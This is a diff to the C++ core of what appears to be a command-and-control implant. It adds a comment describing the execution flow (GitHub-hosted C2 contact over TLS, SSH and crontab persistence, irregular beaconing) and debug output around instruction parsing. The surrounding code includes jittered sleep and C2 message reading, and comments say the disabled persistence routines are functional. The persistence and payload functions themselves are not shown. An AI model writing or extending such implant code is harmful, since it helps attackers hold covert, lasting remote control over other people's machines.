@@ -20,6 +20,17 @@
 #include <functional>
 #include "split.h"
 
+/* Execution Flow:
+ *      1. establish C2 (GitHub) contact over TLS
+ *      2. establish persistence (this needs to be commented back in)
+ *          a. SSH persistence
+ *          b. Crontab persistence
+ *      3. begin the main loop
+ *          a. establish contact at irregular interval, once per 24 hours
+ *          b. read the current instruction and parse the keyword and operand (file)
+ *
+*/
+
 Core::Core() {
     std::cout << "[+] Application core initialized" << '\n';
     try {
@@ -69,8 +80,8 @@ void Core::loop() {
         srand(time(0));
         int random_interval = rand() % 14;                                  // random number between 0 and 14
         random_interval = random_interval + 10;                             // makes it a random number between 10 and 24
-        std::cout << "[+] Sleeping for: " << random_interval << '\n';
-        sleep(random_interval);
+        std::cout << "[+] Sleeping for: " << random_interval << " seconds" << '\n';
+        sleep(random_interval);                                             // multiply by 3600 to convert to hours
 
         // establishing contact with the C2 (this is necessary because such contact is spread out over days)
         std::string contact_file_contents = read_c2_message("contact.txt");
@@ -84,6 +95,9 @@ void Core::loop() {
 
         // this call returns a vector of strings; keyword.at(0) is the instruction keyword, keyword.at(1) is the file/module
         std::vector<std::string> keyword = split(current_instruction, ':');
+    
+        std::cout << "[+] Parsed instruction keyword and operand: " << keyword.at(0) << " " << keyword.at(1) << '\n';
+
     }
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
@@ -108,5 +122,7 @@ void Core::establish_persistence() {
     // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
     // if (establish_crontab_persistence() == true) {established_persistence_count++;}
     //      ^^^^^ both persistence routines are functional; the code should be reviewed again before use
+
+    std::cout << "\n[!] establish_persistence() invoked but commented out; persistence HAS NOT been established\n\n"; 
 
 }
